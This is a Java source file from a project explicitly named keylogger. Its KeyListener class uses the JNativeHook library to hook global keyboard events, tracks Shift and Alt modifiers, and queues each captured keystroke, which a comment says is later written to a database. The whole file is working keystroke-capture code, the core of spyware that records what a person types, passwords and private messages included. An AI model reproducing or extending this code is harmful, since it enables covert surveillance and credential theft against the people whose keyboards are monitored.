package com.keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.util.LinkedList;
import java.util.Queue;

/*
 * This class implements the NativeKeyListener interface from JNativeHook library. It is used to capture keystrokes and write them into a database.
 * The class is instantiated in the main method of Keylogger class.
 */

public class KeyListener implements NativeKeyListener{
    private Queue<Stroke> keyQueue;
    private boolean isShiftPressed = false;
    private boolean isAltPressed = false;
    
    public KeyListener() {
        keyQueue = new LinkedList<Stroke>();
	}

    public Stroke pollQueue() {
        if (keyQueue.isEmpty()) {
            return null;
        }
        return keyQueue.poll();
    }
	
	public void nativeKeyPressed(NativeKeyEvent e) {
        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            isShiftPressed = true;
        } else if (e.getKeyCode() == NativeKeyEvent.VC_ALT) {
            isAltPressed = true;
        }

        if (isShiftPressed && Stroke.shiftKeys.containsKey(e.getKeyCode())) {
            keyQueue.add(new Stroke(Stroke.shiftKeys.get(e.getKeyCode()), "timestamp"));
        } else if (isAltPressed && Stroke.altGrKeys.containsKey(e.getKeyCode())) {
            keyQueue.add(new Stroke(Stroke.altGrKeys.get(e.getKeyCode()), "timestamp"));
        } else if (Stroke.simpleKeys.containsKey(e.getKeyCode())) {
            keyQueue.add(new Stroke(Stroke.simpleKeys.get(e.getKeyCode()), "timestamp"));
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            isShiftPressed = false;
        } else if (e.getKeyCode() == NativeKeyEvent.VC_ALT) {
            isAltPressed = false;
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }


}
